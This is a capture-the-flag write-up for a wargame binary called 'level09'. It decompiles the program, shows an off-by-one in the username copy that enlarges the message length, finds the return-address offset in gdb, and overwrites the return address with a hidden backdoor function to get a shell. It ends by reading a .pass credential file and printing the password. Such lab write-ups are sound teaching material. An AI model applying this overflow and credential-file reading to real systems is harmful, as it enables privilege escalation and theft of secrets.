```shell
$> ls -la
[...]
-rwsr-s---+ 1 end     users   12959 Oct  2  2016 level09
[...]

$> ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: kaye
>: Welcome, kaye
>: Msg @Unix-Dude
>>: 42
>: Msg sent!
```

Analyze with ghidra and disassembler the code in GDB

```c
[...]
typedef struct s_u {
    char    msg[140];
    char    uname[40];
    int     len;
}   t_u;
[...]
void    set_msg(t_u *u) {
    char    buff[0x400] = {0};

    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets((char *)buff, 0x400, stdin);
    strncpy(u->msg, buff, u->len);
}
[...]
void set_username(t_u *u) {
    [...]
    for (int i = 0; i < 0x29 && buff[i] != '\0'; i++) u->uname[i] = buff[i];
    [...]
}
[...]
void handle_msg(void) {
    t_u u;

    u.len = 140;
    set_username(&u);
    set_msg(&u);
    puts(">: Msg sent!");
    return;
}
[...]

// we have here a struct containing the message string and the username string, and the length of the message string
// we have a function secret_backdoor can be help us to get a shell, but it is never called
// in set_msg() we copy string of input to the message using strncpy() with a limit of 140 characters
// but in set_username() we can copy 41 characters from the input string to the username string
// that can overflow the buffer by 1 byte
// and it will overwrite the next element of the struct: length of the message string
// we can use this overflow to help us to call the secret_backdoor function
```

```shell
# read source.c is better to understand the logic of the code
```

```shell
$> gdb -q level09
(gdb) info function
[...]
0x000055555555488c  secret_backdoor
[...]

# get the address of the secret_backdoor function

$> python -c "print 'a' * 40 + '\xff' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9'" > /tmp/offset

# 'a' * 40: padding of 40 bytes
# '\xff': give 255 as the length of the message
# 'Aa0[...]': a long string (300 bytes) to get the eip

$> gdb -q level09
(gdb) disas handle_msg
[...]
0x000000000000092b <+107>:   callq  0x730 <puts@plt>
[...]

(gdb) b *handle_msg+107
[...]

(gdb) r < /tmp/offset
[...]

(gdb) info frame
[...]
  rbp at 0x7fffffffe570, rip at 0x7fffffffe578
[...]

# rip at 0x7fffffffe578

(gdb) info register
[...]
rsp            0x7fffffffe4b0   0x7fffffffe4b0
[...]

# with x /s 0x7fffffffe4b0 (rsp) we have "8Ac9Ad0Ad1Ad2Ad3Ad4A[...]"
# with x /s 0x7fffffffe578 (rip) we have "j5Aj6Aj7Aj8Aj9\n"
# if we look in our long string, we can also found 200 bytes between 8 and j
# We can also do 0x7fffffffe578 - 0x7fffffffe4b0 = 0xc8 = 200, to found the offset

$> python -c "print 'a' * 40 + '\xff'" > /tmp/ow

$> python -c "print '\x90' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" > /tmp/exploit

$> (cat /tmp/ow; cat /tmp/exploit; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```